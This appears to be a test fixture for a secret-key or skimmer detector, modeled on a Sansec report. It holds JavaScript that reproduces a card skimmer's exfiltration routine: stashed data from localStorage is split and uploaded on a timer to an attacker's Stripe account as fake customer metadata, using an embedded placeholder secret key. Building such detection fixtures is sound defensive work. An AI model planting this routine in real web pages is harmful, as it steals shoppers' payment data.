// expect: stripe-secret-key
// Modeled on the same Sansec report: a separate routine uploads the stashed blob to the attacker's own
// Stripe account as fake customer metadata, using a secret key embedded in the page.
function pdat() {
  var d = localStorage.getItem('cus_customer_id');
  if (!d) return;
  clearInterval(iv);
  var h = Math.floor(d.length / 2);
  fetch('https://api.stripe.com/v1/customers', {
    method: 'POST',
    headers: { Authorization: 'Bearer sk_test_EXAMPLEEXAMPLEEXAMPLE00000000' },
    body: 'email=x&metadata[customer_id]=' + encodeURIComponent(d.slice(0, h)) + '&metadata[device_id]=' + encodeURIComponent(d.slice(h))
  }).then(function (r) { if (r.ok) localStorage.removeItem('cus_customer_id'); });
}
setTimeout(pdat, 1000);
var iv = setInterval(pdat, 60000);
